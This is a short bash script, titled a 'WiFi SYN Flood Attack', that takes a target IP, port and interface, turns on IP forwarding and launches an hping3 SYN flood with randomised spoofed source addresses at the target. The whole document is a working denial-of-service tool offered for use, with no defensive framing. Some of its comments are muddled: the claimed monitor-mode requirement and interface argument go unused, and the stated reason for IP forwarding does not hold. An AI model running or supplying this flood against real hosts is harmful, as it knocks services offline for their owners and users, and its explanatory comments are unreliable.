#!/bin/bash
# WiFi SYN Flood Attack (Requires monitor mode)
# Usage: ./wifi_syn_flood.sh <TARGET_IP> <TARGET_PORT> <INTERFACE>

if [ -z "$1" ] || [ -z "$2" ] || [ -z "$3" ]; then
    echo "Usage: $0 <TARGET_IP> <TARGET_PORT> <MONITOR_INTERFACE>"
    exit 1
fi

TARGET_IP=$1
TARGET_PORT=$2
INTERFACE=$3

# Enable IP forwarding to avoid local RST packets
echo 1 > /proc/sys/net/ipv4/ip_forward

# Launch SYN flood with random source ports
echo "[*] Starting SYN flood on $TARGET_IP:$TARGET_PORT..."
hping3 -S -p $TARGET_PORT --flood --rand-source $TARGET_IP
